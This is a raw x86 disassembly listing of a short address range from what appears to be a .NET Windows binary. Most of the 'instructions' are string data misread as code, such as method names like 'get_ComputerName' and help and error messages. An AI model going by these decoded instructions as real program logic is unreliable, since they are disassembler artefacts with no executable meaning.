  40904e:	popa   
  40904f:	ins    DWORD PTR es:[edi],dx
  409050:	add    BYTE PTR gs:[ecx+eiz*2+0x74],al
  409055:	popa   
  409056:	bound  esp,QWORD PTR [ecx+0x73]
  409059:	gs inc ebx
  40905b:	outs   dx,DWORD PTR ds:[esi]
  40905c:	ins    BYTE PTR es:[edi],dx
  40905d:	ins    BYTE PTR es:[edi],dx
  40905e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  409063:	outs   dx,BYTE PTR ds:[esi]
  409064:	add    BYTE PTR [edi+0x65],ah
  409067:	je     0x4090c8
  409069:	inc    esp
  40906a:	popa   
  40906b:	je     0x4090ce
  40906d:	bound  esp,QWORD PTR [ecx+0x73]
  409070:	gs jae 0x409073
  409073:	push   ebx
  409074:	imul   ebp,DWORD PTR [ebp+0x70],0x624f656c
  40907b:	push   0x65
  40907d:	arpl   WORD PTR [ebx+eax*2+0x6f],si
  409081:	ins    BYTE PTR es:[edi],dx
  409082:	ins    BYTE PTR es:[edi],dx
  409083:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  409088:	outs   dx,BYTE PTR ds:[esi]
  409089:	inc    edx
  40908a:	popa   
  40908b:	jae    0x4090f2
  40908d:	add    BYTE PTR [edi+0x65],ah
  409090:	je     0x4090f1
  409092:	inc    ebx
  409093:	jne    0x409107
  409095:	jb     0x4090fc
  409097:	outs   dx,BYTE PTR ds:[esi]
  409098:	je     0x4090ef
  40909a:	dec    ecx
  40909b:	inc    ebx
  40909c:	jne    0x40910a
  40909e:	je     0x409115
  4090a0:	jb     0x409107
  4090a2:	add    BYTE PTR [ecx+0x46],cl
  4090a5:	outs   dx,DWORD PTR ds:[esi]
  4090a6:	jb     0x409115
  4090a8:	popa   
  4090a9:	je     0x4090fb
  4090ab:	jb     0x40911c
  4090ad:	jbe    0x409118
  4090af:	fs gs jb 0x4090b3
  4090b3:	inc    esi
  4090b4:	outs   dx,DWORD PTR ds:[esi]
  4090b5:	jb     0x409124
  4090b7:	popa   
  4090b8:	je     0x4090ba
  4090ba:	inc    ecx
  4090bb:	jo     0x40912d
  4090bd:	ins    BYTE PTR es:[edi],dx
  4090be:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4090c5:	inc    ebp
  4090c6:	js     0x40912b
  4090c8:	gs jo  0x40913f
  4090cb:	imul   ebp,DWORD PTR [edi+0x6e],0x6e6f4300
  4090d2:	je     0x409139
  4090d4:	js     0x40914a
  4090d6:	inc    edx
  4090d7:	popa   
  4090d8:	jae    0x40913f
  4090da:	add    BYTE PTR [ecx+0x45],cl
  4090dd:	outs   dx,BYTE PTR ds:[esi]
  4090de:	imul   ebp,DWORD PTR [bp+0x65],0x64644100
  4090e6:	push   ebx
  4090e7:	gs jb  0x409160
  4090ea:	gs jb  0x4090ed
  4090ed:	addr16 gs je 0x409150
  4090f1:	inc    ebp
  4090f2:	js     0x409157
  4090f4:	gs jo  0x40916b
  4090f7:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4090fe:	pop    edi
  4090ff:	inc    ebx
  409100:	outs   dx,DWORD PTR ds:[esi]
  409101:	fs add BYTE PTR gs:[ecx+ebp*2+0x61],al
  409107:	outs   dx,BYTE PTR ds:[si]
  409109:	outs   dx,DWORD PTR ds:[esi]
  40910a:	jae    0x409180
  40910c:	imul   esp,DWORD PTR [ebx+0x73],0x6e657645
  409113:	je     0x409169
  409115:	jns    0x409187
  409117:	add    BYTE PTR gs:[edi+0x65],ah
  40911b:	je     0x40917c
  40911d:	push   esp
  40911e:	jns    0x409190
  409120:	add    BYTE PTR gs:[edi+0x65],ah
  409124:	je     0x409185
  409126:	inc    esp
  409127:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  40912e:	imul   esp,DWORD PTR [ebx+0x0],0x72616843
  409135:	add    BYTE PTR [edi+0x65],ah
  409138:	je     0x409199
  40913a:	dec    ecx
  40913b:	outs   dx,BYTE PTR ds:[esi]
  40913c:	jbe    0x40919f
  40913e:	jb     0x4091a9
  409140:	popa   
  409141:	outs   dx,BYTE PTR ds:[esi]
  409142:	je     0x409187
  409144:	jne    0x4091b2
  409146:	je     0x4091bd
  409148:	jb     0x4091af
  40914a:	add    BYTE PTR [ebx+0x6f],al
  40914d:	outs   dx,BYTE PTR ds:[esi]
  40914e:	jbe    0x4091b5
  409150:	jb     0x4091c6
  409152:	add    BYTE PTR [edi+0x65],ah
  409155:	je     0x4091b6
  409157:	dec    edi
  409158:	bound  ebp,QWORD PTR [edx+0x65]
  40915b:	arpl   WORD PTR [esi+ecx*2+0x61],si
  40915f:	ins    DWORD PTR es:[edi],dx
  409160:	add    BYTE PTR gs:[edi+0x72],dl
  409164:	imul   esi,DWORD PTR [ebp+eiz*2+0x56],0x65756c61
  40916c:	add    BYTE PTR [ecx+0x73],al
  40916f:	jae    0x4091d6
  409171:	ins    DWORD PTR es:[edi],dx
  409172:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  409176:	inc    edi
  409177:	gs je  0x4091bf
  40917a:	js     0x4091e1
  40917c:	arpl   WORD PTR [ebp+0x74],si
  40917f:	imul   ebp,DWORD PTR [esi+0x67],0x65737341
  409186:	ins    DWORD PTR es:[edi],dx
  409187:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40918b:	inc    edi
  40918c:	gs je  0x4091d2
  40918f:	jne    0x409204
  409191:	je     0x409202
  409193:	ins    DWORD PTR es:[edi],dx
  409194:	inc    ecx
  409195:	je     0x40920b
  409197:	jb     0x409202
  409199:	bound  esi,QWORD PTR [ebp+0x74]
  40919c:	gs jae 0x40919f
  40919f:	addr16 gs je 0x409202
  4091a3:	push   esp
  4091a4:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x5f706f00
  4091ac:	dec    ecx
  4091ad:	outs   dx,BYTE PTR ds:[esi]
  4091ae:	gs jno 0x409226
  4091b1:	popa   
  4091b2:	ins    BYTE PTR es:[edi],dx
  4091b3:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x5f746567
  4091bb:	inc    ebx
  4091bc:	outs   dx,DWORD PTR ds:[esi]
  4091bd:	fs gs inc edx
  4091c0:	popa   
  4091c1:	jae    0x409228
  4091c3:	add    BYTE PTR [eax+0x61],dl
  4091c6:	je     0x409230
  4091c8:	add    BYTE PTR [edi+0x65],al
  4091cb:	je     0x409213
  4091cd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  4091d5:	imul   esi,DWORD PTR [eax+ebp*2+0x6f],0x78457475
  4091dd:	je     0x409244
  4091df:	outs   dx,BYTE PTR ds:[esi]
  4091e0:	jae    0x40924b
  4091e2:	outs   dx,DWORD PTR ds:[esi]
  4091e3:	outs   dx,BYTE PTR ds:[esi]
  4091e4:	add    BYTE PTR [edi+0x65],ah
  4091e7:	je     0x409248
  4091e9:	dec    ecx
  4091ea:	outs   dx,BYTE PTR ds:[esi]
  4091eb:	outs   dx,WORD PTR ds:[esi]
  4091ed:	jb     0x40925c
  4091ef:	popa   
  4091f0:	je     0x40925b
  4091f2:	outs   dx,DWORD PTR ds:[esi]
  4091f3:	outs   dx,BYTE PTR ds:[esi]
  4091f4:	popa   
  4091f5:	ins    BYTE PTR es:[edi],dx
  4091f6:	push   esi
  4091f7:	gs jb  0x40926d
  4091fa:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  409201:	pop    edi
  409202:	push   eax
  409203:	jb     0x409274
  409205:	fs jne 0x40926b
  409208:	je     0x40920a
  40920a:	arpl   WORD PTR cs:[ebx+0x74],sp
  40920e:	outs   dx,DWORD PTR ds:[esi]
  40920f:	jb     0x409211
  409211:	inc    ebx
  409212:	outs   dx,DWORD PTR ds:[esi]
  409213:	outs   dx,BYTE PTR ds:[esi]
  409214:	je     0x409277
  409216:	imul   ebp,DWORD PTR [esi+0x73],0x79654b
  40921d:	inc    esp
  40921e:	ins    BYTE PTR es:[edi],dx
  40921f:	ins    BYTE PTR es:[edi],dx
  409220:	dec    ecx
  409221:	ins    DWORD PTR es:[edi],dx
  409222:	jo     0x409293
  409224:	jb     0x40929a
  409226:	inc    ecx
  409227:	je     0x40929d
  409229:	jb     0x409294
  40922b:	bound  esi,QWORD PTR [ebp+0x74]
  40922e:	add    BYTE PTR gs:[ebx+0x65],cl
  409232:	jb     0x4092a2
  409234:	gs ins BYTE PTR es:[edi],dx
  409236:	xor    esi,DWORD PTR [edx]
  409238:	add    BYTE PTR [ebx+0x65],dh
  40923b:	je     0x40929c
  40923d:	inc    esp
  40923e:	popa   
  40923f:	je     0x4092a2
  409241:	push   ebx
  409242:	outs   dx,DWORD PTR ds:[esi]
  409243:	jne    0x4092b7
  409245:	arpl   WORD PTR [ebp+0x0],sp
  409248:	jae    0x4092af
  40924a:	je     0x4092ab
  40924c:	inc    ebx
  40924d:	outs   dx,DWORD PTR ds:[esi]
  40924e:	outs   dx,BYTE PTR ds:[esi]
  40924f:	outs   dx,BYTE PTR ds:[esi]
  409250:	arpl   WORD PTR gs:[esp+edx*2+0x69],si
  409255:	ins    DWORD PTR es:[edi],dx
  409256:	outs   dx,DWORD PTR gs:[esi]
  409258:	jne    0x4092ce
  40925a:	add    BYTE PTR [edi+0x65],al
  40925d:	je     0x4092a4
  40925f:	outs   dx,BYTE PTR ds:[esi]
  409260:	jbe    0x4092cb
  409262:	jb     0x4092d3
  409264:	outs   dx,BYTE PTR ds:[esi]
  409265:	ins    DWORD PTR es:[edi],dx
  409266:	outs   dx,BYTE PTR gs:[esi]
  409268:	je     0x4092c0
  40926a:	popa   
  40926b:	jb     0x4092d6
  40926d:	popa   
  40926e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  409272:	push   esp
  409273:	outs   dx,DWORD PTR ds:[esi]
  409274:	dec    ecx
  409275:	outs   dx,BYTE PTR ds:[esi]
  409276:	je     0x4092ab
  409278:	xor    al,BYTE PTR [eax]
  40927a:	jae    0x4092e1
  40927c:	je     0x4092dd
  40927e:	dec    ecx
  40927f:	outs   dx,BYTE PTR ds:[esi]
  409280:	je     0x4092e7
  409282:	addr16 jb 0x4092e6
  409285:	je     0x4092ec
  409287:	fs push ebx
  409289:	arpl   WORD PTR gs:[ebp+0x72],si
  40928d:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x5f746573
  409295:	push   ebp
  409296:	jae    0x4092fd
  409298:	jb     0x4092e3
  40929a:	inc    esp
  40929b:	add    BYTE PTR [ebx+0x65],dh
  40929e:	je     0x4092ff
  4092a0:	push   eax
  4092a1:	popa   
  4092a2:	jae    0x409317
  4092a4:	ja     0x409315
  4092a6:	jb     0x40930c
  4092a8:	add    BYTE PTR [edi+0x72],dl
  4092ab:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x74786554
  4092b3:	push   edx
  4092b4:	gs popa 
  4092b6:	fs gs jb 0x4092ba
  4092ba:	addr16 gs je 0x40931d
  4092be:	dec    ecx
  4092bf:	outs   dx,BYTE PTR ds:[esi]
  4092c0:	add    BYTE PTR [edx+0x65],dl
  4092c3:	popa   
  4092c4:	fs dec esp
  4092c6:	imul   ebp,DWORD PTR [esi+0x65],0x74656700
  4092cd:	pop    edi
  4092ce:	dec    esp
  4092cf:	outs   dx,BYTE PTR gs:[esi]
  4092d1:	addr16 je 0x40933c
  4092d4:	add    BYTE PTR [ebx+0x74],dl
  4092d7:	jb     0x409342
  4092d9:	outs   dx,BYTE PTR ds:[esi]
  4092da:	addr16 inc ebx
  4092dc:	outs   dx,DWORD PTR ds:[esi]
  4092dd:	ins    DWORD PTR es:[edi],dx
  4092de:	jo     0x409341
  4092e0:	jb     0x40934b
  4092e2:	jae    0x409353
  4092e4:	outs   dx,BYTE PTR ds:[esi]
  4092e5:	add    BYTE PTR [ebx+0x74],dl
  4092e8:	popa   
  4092e9:	jb     0x40935f
  4092eb:	jae    0x409344
  4092ed:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x73627553
  4092f5:	je     0x409369
  4092f7:	imul   ebp,DWORD PTR [esi+0x67],0x75714500
  4092fe:	popa   
  4092ff:	ins    BYTE PTR es:[edi],dx
  409300:	jae    0x409302
  409302:	inc    esi
  409303:	jb     0x409374
  409305:	ins    DWORD PTR es:[edi],dx
  409306:	push   ebx
  409307:	arpl   WORD PTR gs:[edi+0x6e],bp
  40930b:	fs jae 0x40930e
  40930e:	inc    ebp
  40930f:	outs   dx,BYTE PTR ds:[esi]
  409310:	fs jae 0x40936a
  409313:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x75727453
  40931b:	arpl   WORD PTR [esp+ecx*2+0x61],si
  40931f:	jns    0x409390
  409321:	jne    0x409397
  409323:	inc    ecx
  409324:	je     0x40939a
  409326:	jb     0x409391
  409328:	bound  esi,QWORD PTR [ebp+0x74]
  40932b:	add    BYTE PTR gs:[ecx+eiz*2+0x79],cl
  409330:	outs   dx,DWORD PTR ds:[esi]
  409331:	jne    0x4093a7
  409333:	dec    ebx
  409334:	imul   ebp,DWORD PTR [esi+0x64],0x73795300
  40933b:	je     0x4093a2
  40933d:	ins    DWORD PTR es:[edi],dx
  40933e:	cs inc ebx
  409340:	outs   dx,DWORD PTR ds:[esi]
  409341:	fs gs inc esp
  409344:	outs   dx,DWORD PTR ds:[esi]
  409345:	ins    DWORD PTR es:[edi],dx
  409346:	cs inc ebx
  409348:	outs   dx,DWORD PTR ds:[esi]
  409349:	ins    DWORD PTR es:[edi],dx
  40934a:	jo     0x4093b5
  40934c:	ins    BYTE PTR es:[edi],dx
  40934d:	gs jb  0x409350
  409350:	inc    edi
  409351:	outs   dx,BYTE PTR gs:[esi]
  409353:	gs jb  0x4093b7
  409356:	je     0x4093bd
  409358:	fs inc ebx
  40935a:	outs   dx,DWORD PTR ds:[esi]
  40935b:	fs gs inc ecx
  40935e:	je     0x4093d4
  409360:	jb     0x4093cb
  409362:	bound  esi,QWORD PTR [ebp+0x74]
  409365:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40936a:	jne    0x4093d3
  40936c:	addr16 gs jb 0x4093be
  409370:	outs   dx,DWORD PTR ds:[esi]
  409371:	outs   dx,BYTE PTR ds:[esi]
  409372:	push   ebp
  409373:	jae    0x4093da
  409375:	jb     0x4093ba
  409377:	outs   dx,DWORD PTR ds:[esi]
  409378:	fs gs inc ecx
  40937b:	je     0x4093f1
  40937d:	jb     0x4093e8
  40937f:	bound  esi,QWORD PTR [ebp+0x74]
  409382:	add    BYTE PTR gs:[ebx+0x6f],al
  409386:	ins    DWORD PTR es:[edi],dx
  409387:	jo     0x4093f2
  409389:	ins    BYTE PTR es:[edi],dx
  40938a:	gs jb  0x4093d4
  40938d:	outs   dx,BYTE PTR gs:[esi]
  40938f:	gs jb  0x4093f3
  409392:	je     0x4093f9
  409394:	fs inc ecx
  409396:	je     0x40940c
  409398:	jb     0x409403
  40939a:	bound  esi,QWORD PTR [ebp+0x74]
  40939d:	add    BYTE PTR gs:[edx+0x65],dl
  4093a1:	data16 gs jb 0x40940a
  4093a5:	outs   dx,BYTE PTR ds:[esi]
  4093a6:	arpl   WORD PTR [ebp+0x45],sp
  4093a9:	jno    0x409420
  4093ab:	popa   
  4093ac:	ins    BYTE PTR es:[edi],dx
  4093ad:	jae    0x4093af
  4093af:	addr16 gs je 0x409412
  4093b3:	inc    ecx
  4093b4:	jae    0x409429
  4093b6:	gs ins DWORD PTR es:[edi],dx
  4093b8:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4093bc:	inc    edi
  4093bd:	gs je  0x409413
  4093c0:	je     0x409434
  4093c2:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  4093c9:	je     0x409430
  4093cb:	ins    DWORD PTR es:[edi],dx
  4093cc:	cs inc ebx
  4093ce:	outs   dx,DWORD PTR ds:[esi]
  4093cf:	ins    DWORD PTR es:[edi],dx
  4093d0:	jo     0x409441
  4093d2:	outs   dx,BYTE PTR ds:[esi]
  4093d3:	outs   dx,BYTE PTR gs:[esi]
  4093d5:	je     0x409424
  4093d7:	outs   dx,DWORD PTR ds:[esi]
  4093d8:	fs gs ins BYTE PTR es:[edi],dx
  4093db:	add    BYTE PTR [ebp+0x64],al
  4093de:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  4093e6:	jae    0x409449
  4093e8:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  4093ec:	je     0x409462
  4093ee:	jb     0x409459
  4093f0:	bound  esi,QWORD PTR [ebp+0x74]
  4093f3:	add    BYTE PTR gs:[ebp+0x64],al
  4093f7:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  4093ff:	jae    0x409462
  409401:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  409405:	je     0x409468
  409407:	je     0x40946e
  409409:	add    BYTE PTR [ebx+0x79],dl
  40940c:	jae    0x409482
  40940e:	gs ins DWORD PTR es:[edi],dx
  409410:	cs push ebx
  409412:	arpl   WORD PTR gs:[ebp+0x72],si
  409416:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x65766e55
  40941e:	jb     0x409489
  409420:	imul   sp,WORD PTR [ecx+0x62],0x656c
  409426:	inc    ebx
  409427:	outs   dx,DWORD PTR ds:[esi]
  409428:	fs gs inc ecx
  40942b:	je     0x4094a1
  40942d:	jb     0x409498
  40942f:	bound  esi,QWORD PTR [ebp+0x74]
  409432:	add    BYTE PTR gs:[ebx+0x73],dh
  409436:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  40943a:	outs   dx,BYTE PTR ds:[si]
  40943c:	outs   dx,DWORD PTR ds:[esi]
  40943d:	jae    0x4094a4
  40943f:	cs dec esp
  409441:	outs   dx,DWORD PTR ds:[esi]
  409442:	arpl   WORD PTR [ecx+0x6c],sp
  409445:	imul   edi,DWORD PTR [edx+0x65],0x65722e64
  40944c:	jae    0x4094bd
  40944e:	jne    0x4094c2
  409450:	arpl   WORD PTR [ebp+0x73],sp
  409453:	add    BYTE PTR [eax],al
  409455:	sub    eax,0x73006d
  40945a:	sub    eax,0x65006800
  40945f:	add    BYTE PTR [eax+eax*1+0x70],ch
  409463:	add    BYTE PTR [edx],bh
  409465:	add    BYTE PTR [edi],ch
  409467:	add    BYTE PTR [edi],ch
  409469:	add    BYTE PTR [ebp+0x0],cl
  40946c:	push   ebx
  40946d:	add    BYTE PTR [esi],ch
  40946f:	add    BYTE PTR [ebx+0x0],dl
  409472:	push   ecx
  409473:	add    BYTE PTR [eax+eax*1+0x43],cl
  409477:	add    BYTE PTR [ebx+0x0],al
  40947a:	add    BYTE PTR cs:[esi+0x0],dh
  40947e:	xor    DWORD PTR [eax],eax
  409480:	xor    DWORD PTR [eax],eax
  409482:	add    DWORD PTR [ebx],ebp
  409484:	inc    esp
  409485:	add    BYTE PTR [ecx+0x0],ch
  409488:	popa   
  409489:	add    BYTE PTR [edi+0x0],ah
  40948c:	outs   dx,BYTE PTR ds:[esi]
  40948d:	add    BYTE PTR [edi+0x0],ch
  409490:	jae    0x409492
  409492:	je     0x409494
  409494:	imul   eax,DWORD PTR [eax],0x490063
  40949a:	outs   dx,BYTE PTR ds:[esi]
  40949b:	add    BYTE PTR [esi+0x0],ah
  40949e:	outs   dx,DWORD PTR ds:[esi]
  40949f:	add    BYTE PTR [edx+0x0],dh
  4094a2:	ins    DWORD PTR es:[edi],dx
  4094a3:	add    BYTE PTR [ecx+0x0],ah
  4094a6:	je     0x4094a8
  4094a8:	imul   eax,DWORD PTR [eax],0x6e006f
  4094ae:	add    BYTE PTR ds:0x610042,cl
  4094b4:	outs   dx,BYTE PTR ds:[esi]
  4094b5:	add    BYTE PTR [esi+0x0],ch
  4094b8:	add    BYTE PTR gs:[edx+0x0],dh
  4094bc:	add    BYTE PTR [ebx],cl
  4094be:	je     0x4094c0
  4094c0:	imul   eax,DWORD PTR [eax],0x6c0074
  4094c6:	add    BYTE PTR gs:[eax],al
  4094c9:	pshufw mm0,QWORD PTR [eax],0x72
  4094cd:	add    BYTE PTR [edi+0x0],ch
  4094d0:	add    BYTE PTR fs:[ebp+0x0],dh
  4094d4:	arpl   WORD PTR [eax],ax
  4094d6:	je     0x4094d8
  4094d8:	add    BYTE PTR [edi],cl
  4094da:	jbe    0x4094dc
  4094dc:	add    BYTE PTR gs:[edx+0x0],dh
  4094e0:	jae    0x4094e2
  4094e2:	imul   eax,DWORD PTR [eax],0x6e006f
  4094e8:	add    BYTE PTR [edi],cl
  4094ea:	jnp    0x4094ec
  4094ec:	xor    BYTE PTR [eax],al
  4094ee:	jge    0x4094f0
  4094f0:	and    BYTE PTR [eax],al
  4094f2:	jnp    0x4094f4
  4094f4:	xor    DWORD PTR [eax],eax
  4094f6:	jge    0x4094f8
  4094f8:	add    BYTE PTR [edi],al
  4094fa:	jnp    0x4094fc
  4094fc:	xor    BYTE PTR [eax],al
  4094fe:	jge    0x409500
  409500:	add    BYTE PTR ds:0x610044,dl
  409506:	je     0x409508
  409508:	popa   
  409509:	add    BYTE PTR [ebx+0x0],dh
  40950c:	outs   dx,DWORD PTR ds:[esi]
  40950d:	add    BYTE PTR [ebp+0x0],dh
  409510:	jb     0x409512
  409512:	arpl   WORD PTR [eax],ax
  409514:	add    BYTE PTR gs:[eax],al
  409517:	sbb    DWORD PTR [esi+0x0],eax
  40951a:	push   edx
  40951b:	add    BYTE PTR [edi+0x0],cl
  40951e:	dec    ebp
  40951f:	add    BYTE PTR [eax],ah
  409521:	add    BYTE PTR [ebx+0x0],dl
  409524:	inc    ebp
  409525:	add    BYTE PTR [edx+0x0],dl
  409528:	push   esi
  409529:	add    BYTE PTR [ecx+0x0],cl
  40952c:	inc    ebx
  40952d:	add    BYTE PTR [ebp+0x0],al
  409530:	add    BYTE PTR ds:0x4f0054,dl
  409536:	and    BYTE PTR [eax],al
  409538:	push   ebx
  409539:	add    BYTE PTR [ebp+0x0],al
  40953c:	push   edx
  40953d:	add    BYTE PTR [esi+0x0],dl
  409540:	dec    ecx
  409541:	add    BYTE PTR [ebx+0x0],al
  409544:	inc    ebp
  409545:	add    BYTE PTR [eax],al
  409547:	cmove  eax,DWORD PTR [eax]
  40954a:	inc    ebp
  40954b:	add    BYTE PTR [esi+0x0],al
  40954e:	inc    ecx
  40954f:	add    BYTE PTR [ebp+0x0],dl
  409552:	dec    esp
  409553:	add    BYTE PTR [eax+eax*1+0x0],dl
  409557:	or     eax,0x61006d
  40955c:	jae    0x40955e
  40955e:	je     0x409560
  409560:	add    BYTE PTR gs:[edx+0x0],dh
  409564:	add    BYTE PTR [ecx],al
  409566:	add    BYTE PTR [ebx],bh
  409568:	jnp    0x40956a
  40956a:	xor    al,0x0
  40956c:	jge    0x40956e
  40956e:	and    BYTE PTR [eax],al
  409570:	jnp    0x409572
  409572:	xor    BYTE PTR [eax],al
  409574:	sub    al,0x0
  409576:	add    BYTE PTR ss:[ebp+0x0],bh
  40957a:	and    BYTE PTR [eax],al
  40957c:	jnp    0x40957e
  40957e:	xor    DWORD PTR [eax],eax
  409580:	sub    al,0x0
  409582:	sub    eax,0x35003100
  409587:	add    BYTE PTR [ebp+0x0],bh
  40958a:	and    BYTE PTR [eax],al
  40958c:	jnp    0x40958e
  40958e:	xor    al,BYTE PTR [eax]
  409590:	sub    al,0x0
  409592:	sub    eax,0x35003100
  409597:	add    BYTE PTR [ebp+0x0],bh
  40959a:	and    BYTE PTR [eax],al
  40959c:	jnp    0x40959e
  40959e:	xor    eax,DWORD PTR [eax]
  4095a0:	jge    0x4095a2
  4095a2:	add    DWORD PTR [ebx],ecx
  4095a4:	dec    ecx
  4095a5:	add    BYTE PTR [ebx+0x0],dh
  4095a8:	jae    0x4095aa
  4095aa:	jne    0x4095ac
  4095ac:	add    BYTE PTR gs:[eax],al
  4095af:	or     DWORD PTR [ebx+0x0],esp
  4095b2:	outs   dx,DWORD PTR ds:[esi]
  4095b3:	add    BYTE PTR [eax+eax*1+0x65],ah
  4095b7:	add    BYTE PTR [eax],al
  4095b9:	or     ebp,DWORD PTR [eax+eax*1+0x65]
  4095bd:	add    BYTE PTR [esi+0x0],dh
  4095c0:	add    BYTE PTR gs:[eax+eax*1+0x0],ch
  4095c5:	or     DWORD PTR [eax+eax*1+0x79],esi
  4095c9:	add    BYTE PTR [eax+0x0],dh
  4095cc:	add    BYTE PTR gs:[eax],al
  4095cf:	or     eax,0x650073
  4095d4:	jb     0x4095d6
  4095d6:	jbe    0x4095d8
  4095d8:	add    BYTE PTR gs:[edx+0x0],dh
  4095dc:	add    BYTE PTR [ecx],dl
  4095de:	add    BYTE PTR fs:[ecx+0x0],ah
  4095e2:	je     0x4095e4
  4095e4:	popa   
  4095e5:	add    BYTE PTR [edx+0x0],ah
  4095e8:	popa   
  4095e9:	add    BYTE PTR [ebx+0x0],dh
  4095ec:	add    BYTE PTR gs:[eax],al
  4095ef:	or     eax,0x62006f
  4095f4:	push   0x0
  4095f6:	add    BYTE PTR gs:[ebx+0x0],ah
  4095fa:	je     0x4095fc
  4095fc:	add    BYTE PTR [ecx+0x53005303],cl
  409602:	add    BYTE PTR [edx+0x0],al
  409605:	inc    esp
  409606:	add    BYTE PTR [ecx+0x0],cl
  409609:	inc    ecx
  40960a:	add    BYTE PTR [edi+0x0],al
  40960d:	dec    esi
  40960e:	add    BYTE PTR [edi+0x0],cl
  409611:	push   ebx
  409612:	add    BYTE PTR [ebp+0x0],al
  409615:	or     eax,0x9000a00
  40961a:	add    BYTE PTR [ebx+0x0],bl
  40961d:	cmp    al,0x0
  40961f:	inc    edi
  409620:	add    BYTE PTR [ebp+0x0],ah
  409623:	outs   dx,BYTE PTR ds:[esi]
  409624:	add    BYTE PTR [ebp+0x0],ah
  409627:	jb     0x409629
  409629:	popa   
  40962a:	add    BYTE PTR [eax+eax*1+0x4f],ch
  40962e:	add    BYTE PTR [eax+0x0],dh
  409631:	je     0x409633
  409633:	imul   eax,DWORD PTR [eax],0x6e006f
  409639:	jae    0x40963b
  40963b:	add    BYTE PTR ds:[ebp+0x0],bl
  40963f:	and    BYTE PTR [eax],al
  409641:	jnp    0x409643
  409643:	cmp    al,0x0
  409645:	inc    ebx
  409646:	add    BYTE PTR [edi+0x0],ch
  409649:	outs   dx,BYTE PTR ds:[esi]
  40964a:	add    BYTE PTR [esi+0x0],ah
  40964d:	imul   eax,DWORD PTR [eax],0x750067
  409653:	jb     0x409655
  409655:	popa   
  409656:	add    BYTE PTR [eax+eax*1+0x69],dh
  40965a:	add    BYTE PTR [edi+0x0],ch
  40965d:	outs   dx,BYTE PTR ds:[esi]
  40965e:	add    BYTE PTR [esi],bh
  409660:	add    BYTE PTR [eax],ah
  409662:	add    BYTE PTR [eax+eax*1+0x20],bh
  409666:	add    BYTE PTR [eax+eax*1],bh
  409669:	push   edx
  40966a:	add    BYTE PTR [ebp+0x0],dh
  40966d:	outs   dx,BYTE PTR ds:[esi]
  40966e:	add    BYTE PTR [eax+eax*1+0x69],dh
  409672:	add    BYTE PTR [ebp+0x0],ch
  409675:	add    BYTE PTR gs:[esi],bh
  409678:	add    BYTE PTR [ebp+0x0],bh
  40967b:	and    BYTE PTR [eax],al
  40967d:	jl     0x40967f
  40967f:	or     eax,0x9000a00
  409684:	add    BYTE PTR [ebx+0x0],bl
  409687:	sub    eax,0x5d003f00
  40968c:	add    BYTE PTR ds:0xd000a00,cl
  409692:	add    BYTE PTR [edx],cl
  409694:	add    BYTE PTR [eax+eax*1],bh
  409697:	inc    edi
  409698:	add    BYTE PTR [ebp+0x0],ah
  40969b:	outs   dx,BYTE PTR ds:[esi]
  40969c:	add    BYTE PTR [ebp+0x0],ah
  40969f:	jb     0x4096a1
  4096a1:	popa   
  4096a2:	add    BYTE PTR [eax+eax*1+0x4f],ch
  4096a6:	add    BYTE PTR [eax+0x0],dh
  4096a9:	je     0x4096ab
  4096ab:	imul   eax,DWORD PTR [eax],0x6e006f
  4096b1:	jae    0x4096b3
  4096b3:	add    BYTE PTR ds:[eax],ah
  4096b6:	add    BYTE PTR [edx],bh
  4096b8:	add    BYTE PTR [edx],bh
  4096ba:	add    BYTE PTR ds:0xd002000,bh
  4096c0:	add    BYTE PTR [edx],cl
  4096c2:	add    BYTE PTR [ecx],cl
  4096c4:	add    BYTE PTR [ebx+0x0],bl
  4096c7:	sub    eax,0x4d005800
  4096cc:	add    BYTE PTR [eax+eax*1+0x5d],cl
  4096d0:	add    BYTE PTR ds:0x9000a00,cl
  4096d6:	add    BYTE PTR [ebx+0x0],bl
  4096d9:	sub    eax,0x45004c00
  4096de:	add    BYTE PTR [esi+0x0],dl
  4096e1:	inc    ebp
  4096e2:	add    BYTE PTR [eax+eax*1+0x20],cl
  4096e6:	add    BYTE PTR [ebx+0x0],bh
  4096e9:	inc    ebp
  4096ea:	add    BYTE PTR [edx+0x0],dl
  4096ed:	push   edx
  4096ee:	add    BYTE PTR [edi+0x0],cl
  4096f1:	push   edx
  4096f2:	add    BYTE PTR [eax],ah
  4096f4:	add    BYTE PTR [eax+eax*1+0x20],bh
  4096f8:	add    BYTE PTR [edi+0x0],dl
  4096fb:	inc    ecx
  4096fc:	add    BYTE PTR [edx+0x0],dl
  4096ff:	dec    esi
  409700:	add    BYTE PTR [ecx+0x0],cl
  409703:	dec    esi
  409704:	add    BYTE PTR [edi+0x0],al
  409707:	and    BYTE PTR [eax],al
  409709:	jl     0x40970b
  40970b:	and    BYTE PTR [eax],al
  40970d:	dec    ecx
  40970e:	add    BYTE PTR [esi+0x0],cl
  409711:	inc    esi
  409712:	add    BYTE PTR [edi+0x0],cl
  409715:	jge    0x409717
  409717:	pop    ebp
  409718:	add    BYTE PTR ds:0x9000a00,cl
  40971e:	add    BYTE PTR [ebx+0x0],bl
  409721:	sub    eax,0x47004900
